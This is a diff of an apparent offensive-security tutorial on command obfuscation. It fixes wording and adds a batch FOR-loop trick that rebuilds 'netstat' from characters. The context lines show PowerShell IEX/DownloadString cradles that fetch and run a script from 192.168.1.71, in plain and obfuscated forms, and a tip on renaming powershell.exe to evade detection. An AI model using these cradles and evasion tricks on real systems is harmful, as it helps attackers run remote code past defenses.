@@ -508,23 +508,32 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - String obfuscated using cmd FOR loop<br />
 `FOR /F "delims=s\ tokens=4" %a IN ('set^|findstr PSM')DO %a Get-Date`
 
-![bash obfuscation](http://i.cubeupload.com/VD3klE.jpg)<br />
+![batch obfuscation](http://i.cubeupload.com/VD3klE.jpg)<br />
 
-![bash obfuscation](http://i.cubeupload.com/PHEyYA.png)<br />
+![batch obfuscation](http://i.cubeupload.com/PHEyYA.png)<br />
 
 - Another example of cmd FOR loop technic<br />
 
-![bash obfuscation](http://i.cubeupload.com/RfM32P.jpg)<br />
+![batch obfuscation](http://i.cubeupload.com/RfM32P.jpg)<br />
+
+- Another example of cmd [ FOR loop + /V:ON + CALL ] technics<br />
+
+      cmd.exe /V:ON /C "set unique=netsa&&FOR %A IN (0 1 2 3 2 4 2 1337) DO set final=!final!!unique:~%A,1!&& IF %A==1337 CALL %final:~-7%"
+
+![batch obfuscation](http://i.cubeupload.com/C8AzE8.png)<br />
+
+![batch obfuscation](http://i.cubeupload.com/a0F8iS.png)<br />
+
 
       WARNING: Remmenber that this screenshots are examples to exec in terminal, so if your plans
       are to use the FOR loop technic then remmenber to input a double number of % in var declarations.
 
-![bash obfuscation](http://i.cubeupload.com/ypR2sm.png)<br />
+![batch obfuscation](http://i.cubeupload.com/ypR2sm.png)<br />
 
       Another technic its to copy powershell.exe from %windir% to %tmp% folder (rewritable location)
       and rename it to another name with a diferent extension and call it to execute powershell args.
 
-![bash obfuscation](http://i.cubeupload.com/fwGdya.jpg)<br />
+![batch obfuscation](http://i.cubeupload.com/fwGdya.jpg)<br />
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
 
@@ -730,13 +739,13 @@ The above string can be obfuscated using **powershell special characters:** **`*
       $method = "D`ow`nlo`adSt`rin`g"
       IEX (New-Object Net.WebClient).$method('http://192.168.1.71/hello.ps1')
 
-      This next example shows how to use 'parenthesis' to transform the DownloadString flag
+      This next example shows how to use 'parentheses' to transform the DownloadString flag
       into one powershell string that can be manipulated using more obfuscated technics ..
 
 - String command to obfuscate<br />
 `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/hello.ps1')`
 
-- String obfuscated [Parenthesis+tick]<br />
+- String obfuscated [Parentheses+tick]<br />
 
       I`EX ((N`ew-Obj`ect N`et.We`bCli`ent)).('Do'+'wn'+'lo'+'adStr'+'ing').Invoke(('h'+'tt'+'p:/'+'/19'+'2.16'+'8.1.71/hello.ps1'))
 
